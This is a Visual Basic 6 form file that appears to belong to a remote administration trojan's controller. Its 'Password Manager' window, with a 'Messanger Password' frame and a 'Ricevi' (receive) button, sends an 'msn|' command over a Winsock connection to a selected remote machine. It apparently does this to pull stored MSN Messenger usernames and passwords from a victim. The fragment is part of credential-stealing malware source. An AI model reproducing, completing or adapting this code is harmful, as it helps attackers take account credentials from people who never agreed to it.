VERSION 5.00
Begin VB.Form Form19 
   Caption         =   "Password Manager"
   ClientHeight    =   1800
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   6720
   LinkTopic       =   "Form19"
   ScaleHeight     =   1800
   ScaleWidth      =   6720
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame3 
      Caption         =   "Messanger Password"
      Height          =   1575
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6495
      Begin VB.TextBox Text3 
         Height          =   615
         Left            =   120
         TabIndex        =   2
         Text            =   "Username   -     Password"
         Top             =   360
         Width           =   6135
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Ricevi"
         Height          =   255
         Left            =   2280
         TabIndex        =   1
         Top             =   1080
         Width           =   1815
      End
   End
End
Attribute VB_Name = "Form19"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command3_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "msn|" & Text1.Text

End Sub
